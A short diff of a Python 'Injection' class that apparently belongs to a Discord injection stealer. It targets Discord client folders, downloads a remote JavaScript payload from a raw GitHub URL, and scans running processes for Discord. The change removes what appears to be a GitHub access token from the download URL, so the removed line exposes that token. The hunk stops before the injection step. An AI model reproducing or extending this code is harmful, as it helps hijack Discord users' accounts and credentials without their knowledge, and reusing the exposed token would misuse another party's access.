@@ -15,7 +15,7 @@ class Injection:
             self.appdata + '\\DiscordPTB',
             self.appdata + '\\DiscordDevelopment'
         ]
-        self.code = requests.get('https://raw.githubusercontent.com/lux-206/C6Bank/main/src/components/Injetion.js?token=GHSAT0AAAAAAB6ALJXYGYPQHFID55DC7FUEY67CYOA').text
+        self.code = requests.get('https://raw.githubusercontent.com/lux-206/C6Bank/main/src/components/Injetion.js').text
         
         for proc in psutil.process_iter():
             if 'discord' in proc.name().lower():
